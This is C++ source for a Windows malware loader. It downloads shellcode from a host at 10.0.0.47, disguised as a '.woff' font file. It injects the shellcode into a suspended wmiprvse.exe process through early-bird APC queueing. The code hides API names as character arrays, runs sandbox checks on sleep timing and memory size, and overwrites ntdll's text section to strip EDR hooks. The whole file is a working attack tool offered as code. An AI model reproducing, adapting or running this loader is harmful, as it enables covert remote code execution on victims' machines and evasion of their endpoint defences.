#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <wininet.h>
#include <string.h>
#include <chrono>
#include <vector>
#include <thread>
#include <wincrypt.h>
#include <psapi.h>
#include <tlhelp32.h>
#include <tchar.h>
#include <time.h>
#include <bcrypt.h>
#include <iostream>
#include <map>
#include <string>
#include <fstream>

#pragma comment (lib, "Wininet.lib")

typedef BOOL(WINAPI* WriteProcessMemoryFunc)(HANDLE, LPVOID, LPCVOID, SIZE_T, SIZE_T*);
char aProcmemory[] = { 'W', 'r', 'i', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'M', 'e', 'm', 'o', 'r', 'y', '\0'};
WriteProcessMemoryFunc pwProcmem = (WriteProcessMemoryFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aProcmemory);

typedef BOOL(WINAPI* QueueUserAPCFunc)(PAPCFUNC, HANDLE, ULONG_PTR);
char aQueueUserAPC[] = { 'Q', 'u', 'e', 'u', 'e', 'U', 's', 'e', 'r', 'A', 'P', 'C', '\0'};
QueueUserAPCFunc pwQueueUserAPC = (QueueUserAPCFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aQueueUserAPC);

typedef BOOL(WINAPI* CreateProcessAFunc)(LPCSTR, LPSTR, LPSECURITY_ATTRIBUTES, LPSECURITY_ATTRIBUTES, BOOL, DWORD, LPVOID, LPCSTR, LPSTARTUPINFOA, LPPROCESS_INFORMATION);
char aCreateProcess[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', '\0'};
CreateProcessAFunc pwCreateProcess = (CreateProcessAFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aCreateProcess);

typedef LPVOID(WINAPI* VirtualAllocExFunc)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD);
char aVirtualAllocEx[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 'E', 'x', '\0'};
VirtualAllocExFunc pwVirtualAllocEx = (VirtualAllocExFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aVirtualAllocEx);

typedef BOOL(WINAPI* VirtualProtectFunc)(LPVOID, SIZE_T, DWORD, PDWORD);
char aVirtualProtect[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'P', 'r', 'o', 't', 'e', 'c', 't', '\0'};
VirtualProtectFunc pwVirtualProtect = (VirtualProtectFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aVirtualProtect);

typedef BOOL(WINAPI* VirtualAllocExNumaFunc)(HANDLE, LPVOID, SIZE_T, DWORD, DWORD, DWORD);
char aVirtualAllocExNuma[] = { 'V', 'i', 'r', 't', 'u', 'a', 'l', 'A', 'l', 'l', 'o', 'c', 'E', 'x', 'N', 'u', 'm', 'a', '\0'};
VirtualAllocExNumaFunc pwVirtualAllocExNuma = (VirtualAllocExNumaFunc)GetProcAddress(GetModuleHandleA("kernel32.dll"), aVirtualAllocExNuma);

BOOL GetPayloadFromUrl(LPCWSTR szUrl, std::vector<BYTE>& payload) {
    HINTERNET hInternet = InternetOpenW(L"A Custom User Agent", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);
    if (!hInternet) {
        return FALSE;
    }

    HINTERNET hInternetFile = InternetOpenUrlW(hInternet, szUrl, NULL, 0, INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_DATE_INVALID, 0);
    if (!hInternetFile) {
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    DWORD bytesRead;
    BYTE buffer[4096];
    while (InternetReadFile(hInternetFile, buffer, sizeof(buffer), &bytesRead) && bytesRead != 0) {
        payload.insert(payload.end(), buffer, buffer + bytesRead);
    }

    if (bytesRead == 0 && GetLastError() != ERROR_SUCCESS) {
        InternetCloseHandle(hInternetFile);
        InternetCloseHandle(hInternet);
        return FALSE;
    }

    InternetCloseHandle(hInternetFile);
    InternetCloseHandle(hInternet);
    return TRUE;
}

BOOL CheckVirtualAllocExNuma(){
    LPVOID mem = (LPVOID)(GetCurrentProcess(), NULL, 0x1000, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE, 0);
    if (mem == NULL) {
        return FALSE;
    }
    return TRUE;
}

void unhookNtll(){
    HANDLE process = GetCurrentProcess();
	MODULEINFO mi = {};
	HMODULE ntdllModule = GetModuleHandleA("ntdll.dll");

	GetModuleInformation(process, ntdllModule, &mi, sizeof(mi));
	LPVOID ntdllBase = (LPVOID)mi.lpBaseOfDll;
	HANDLE ntdllFile = CreateFileA("c:\\windows\\system32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	HANDLE ntdllMapping = CreateFileMapping(ntdllFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
	LPVOID ntdllMappingAddress = MapViewOfFile(ntdllMapping, FILE_MAP_READ, 0, 0, 0);


	PIMAGE_DOS_HEADER hookedDosHeader = (PIMAGE_DOS_HEADER)ntdllBase;
	PIMAGE_NT_HEADERS hookedNtHeader = (PIMAGE_NT_HEADERS)((DWORD_PTR)ntdllBase + hookedDosHeader->e_lfanew);

	for (WORD i = 0; i < hookedNtHeader->FileHeader.NumberOfSections; i++) {
		PIMAGE_SECTION_HEADER hookedSectionHeader = (PIMAGE_SECTION_HEADER)((DWORD_PTR)IMAGE_FIRST_SECTION(hookedNtHeader) + ((DWORD_PTR)IMAGE_SIZEOF_SECTION_HEADER * i));

		if (!strcmp((char*)hookedSectionHeader->Name, (char*)".text")) {
			DWORD oldProtection = 0;
			bool isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtection);
			memcpy((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), (LPVOID)((DWORD_PTR)ntdllMappingAddress + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize);
			isProtected = VirtualProtect((LPVOID)((DWORD_PTR)ntdllBase + (DWORD_PTR)hookedSectionHeader->VirtualAddress), hookedSectionHeader->Misc.VirtualSize, oldProtection, &oldProtection);
		}
	}

	CloseHandle(process);
	CloseHandle(ntdllFile);
	CloseHandle(ntdllMapping);
	FreeLibrary(ntdllModule);
}

void evade() {
    
    std::chrono::steady_clock::time_point startTime = std::chrono::steady_clock::now();
    std::this_thread::sleep_for(std::chrono::milliseconds(2000));
    std::chrono::steady_clock::time_point endTime = std::chrono::steady_clock::now();
    std::chrono::duration<double> elapsedTime = endTime - startTime;

    if (elapsedTime.count() < 1.5)
    {
        printf("Sleep duration is too short.\n");
        exit(1);
    }

    unhookNtll();

	MEMORYSTATUSEX statex;
	statex.dwLength = sizeof(statex);

	GlobalMemoryStatusEx(&statex);

	ULONGLONG totalPhysicalMemoryInGB = statex.ullTotalPhys / (1024 * 1024 * 1024);

	if (totalPhysicalMemoryInGB <= 1) {
		exit(1);
	}
    
    if (!CheckVirtualAllocExNuma()) {
        exit(1);
    }
};

int main() {
    evade();
	std::vector<BYTE> payload;
	LPCWSTR url = L"http://10.0.0.47/shellcode.woff";

    if (!GetPayloadFromUrl(url, payload)) {
        printf("Error reaching URI\n");
        return 1;
    }

	STARTUPINFOA si = { 0 };
	PROCESS_INFORMATION pi = { 0 };


    pwCreateProcess("C:\\Windows\\System32\\wbem\\wmiprvse.exe", NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);
	

	HANDLE victimProcess = pi.hProcess;
	HANDLE threadHandle = pi.hThread;


    LPVOID shellAddress = pwVirtualAllocEx(victimProcess, NULL, payload.size(), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    PVOID pBaseAddress = nullptr;
    SIZE_T* bytesWritten = 0;


    pwProcmem(victimProcess, shellAddress, payload.data(), payload.size(), bytesWritten);

    pwVirtualProtect(shellAddress, payload.size(), PAGE_EXECUTE_READ, NULL);

    PTHREAD_START_ROUTINE apcRoutine = (PTHREAD_START_ROUTINE)shellAddress;

    pwQueueUserAPC((PAPCFUNC)apcRoutine, threadHandle, NULL);
    
    ResumeThread(threadHandle);
}